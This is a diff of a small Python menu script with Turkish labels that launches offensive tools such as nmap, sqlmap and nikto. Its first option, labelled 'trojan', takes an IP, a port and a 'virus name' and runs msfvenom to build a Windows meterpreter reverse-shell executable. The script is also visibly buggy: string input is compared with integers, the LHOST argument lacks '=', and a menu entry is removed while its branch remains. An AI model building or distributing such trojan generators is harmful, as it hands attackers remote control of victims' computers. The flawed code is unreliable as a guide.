@@ -5,25 +5,24 @@ os.system("clear")
 
 banner="""
 ------------
-CANS OFFICIALL WEB TEST TOOLS
+CANS OFFICIALL WEB TOOLS
 ------------
 """
 print(banner)
 
 print("""
-1)trojan yap
-2)nmap
+1)trojan
+2)nmap vuln scanner
 3)sqlmap
 4)ip tarama
 5)payload
 6)nikto
-7)gereksinimler
 """)
 veri=input("----->")
 
 if veri == 1 :
 
-ip=input("cihaz kimligini giriniz:")
+     ip=input("cihaz kimligini giriniz:")
      port=input("portu giriniz:")
      ismin=input("virus ismi:")
      os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)
@@ -44,7 +43,7 @@ elif veri == 6 :
      os.system("nikto")
 
 elif veri == 7 :
-     os.system("pkg update && pkg upgrade && pkg install python2 && pkg install python && pkg install php && pkg install curl && pkg install cat   && pkg install wget && pkg install ruby ")
+     os.system("apt update && pkg upgrade && pkg install python && pkg install python2 && pkg install php && pkg install curl && pkg install perl ")
 
 else :
     print("hata aldim")
